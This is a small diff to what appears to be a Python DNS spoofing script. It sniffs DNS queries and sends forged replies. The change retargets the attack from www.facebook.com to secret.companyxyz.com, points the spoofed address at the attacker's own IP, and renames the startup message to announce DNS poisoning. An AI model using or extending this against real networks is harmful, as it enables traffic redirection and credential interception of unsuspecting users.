@@ -28,8 +28,8 @@ MY_IP = get_if_addr(IFACE)
 DNS_SERVER = "8.8.8.8"
 
 # Attacker Flags
-MALICIOUS_SITE = b"www.facebook.com."
-MALICIOUS_IP = "93.184.216.34"
+MALICIOUS_SITE = b"secret.companyxyz.com."
+MALICIOUS_IP = MY_IP
 
 
 def dns_pkt_filter(pkt):
@@ -83,7 +83,7 @@ def dns_reply(pkt):
 
 def main():
 	""" Main Sniffer Function """
-	print("[*] Starting Program ...")
+	print("[*] Starting DNS Posioning ...")
 	sniff(lfilter=dns_pkt_filter, prn=dns_reply, iface=IFACE)
 
 
